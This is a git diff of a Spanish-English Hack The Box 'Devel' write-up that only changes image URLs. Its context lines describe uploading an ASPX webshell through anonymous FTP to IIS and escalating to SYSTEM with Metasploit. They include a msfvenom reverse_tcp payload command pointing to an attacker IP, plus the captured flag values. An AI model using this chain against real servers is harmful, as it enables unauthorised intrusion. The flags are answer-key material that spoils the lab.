@@ -4,7 +4,7 @@ published: true
 description: "Comprehensive offensive security assessment and penetration testing report for Devel (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
 tags: cybersecurity, hackthebox, pentesting, infosec
 series: "HackTheBox Enterprise Assessments"
-cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_01.png"
+cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_01.png"
 ---
 
 # Offensive Security Assessment Report: Devel
@@ -80,7 +80,7 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 Se identifico el servicio **Microsoft ftpd** corriendo en el puerto TCP 21, junto con un servidor web IIS en el puerto 80. El escaneo revelo que el servicio FTP permite acceso anonimo y que el directorio raiz del FTP es el mismo que el del servidor web IIS:
 
 
-![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_01.png)
+![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_01.png)
 * **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
 
 
@@ -89,7 +89,7 @@ Se identifico el servicio **Microsoft ftpd** corriendo en el puerto TCP 21, junt
 Al conectarse al FTP con credenciales anonimas, se confirmo que es posible subir archivos al servidor usando el comando **put**. Dado que el directorio FTP es la raiz del servidor web IIS, cualquier archivo subido es accesible via HTTP:
 
 
-![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_02.png)
+![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_02.png)
 * **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
 
 
@@ -98,7 +98,7 @@ Al conectarse al FTP con credenciales anonimas, se confirmo que es posible subir
 Los archivos subidos al FTP son directamente accesibles a traves del servidor web. El servidor IIS ejecuta archivos con extension **.aspx** como scripts del lado del servidor. Esto permite subir una webshell ASPX maliciosa via FTP anonimo y ejecutarla a traves del navegador para obtener una reverse shell:
 
 
-![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_03.png)
+![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_03.png)
 * **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -109,7 +109,7 @@ Se genero el payload con msfvenom y se subio al servidor:
 La shell inicial se obtuvo como usuario de servicio web (IIS APPPOOL). Para escalar privilegios, se utilizo el modulo **post/multi/recon/local_exploit_suggester** de Metasploit, que identifico exploits de kernel aplicables al sistema Windows 7:
 
 
-![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_04.png)
+![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_04.png)
 * **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -122,17 +122,17 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f aspx -
 Tras la explotacion, se obtuvo la flag del usuario babis: `16f1f87912acda2db4f07459d7169f88`
 
 
-![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_05.png)
+![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_05.png)
 * **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_06.png)
+![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_06.png)
 * **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_07.png)
+![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_07.png)
 * **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
 
 
@@ -141,7 +141,7 @@ Tras la explotacion, se obtuvo la flag del usuario babis: `16f1f87912acda2db4f07
 Tras la escalada de privilegios exitosa a NT AUTHORITYSYSTEM, se obtuvo la flag del administrador: `9d95dc67efeba16fda37b69b7ffe4ce`
 
 
-![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/devel/images/step_08.png)
+![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/devel/images/step_08.png)
 * **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 ---
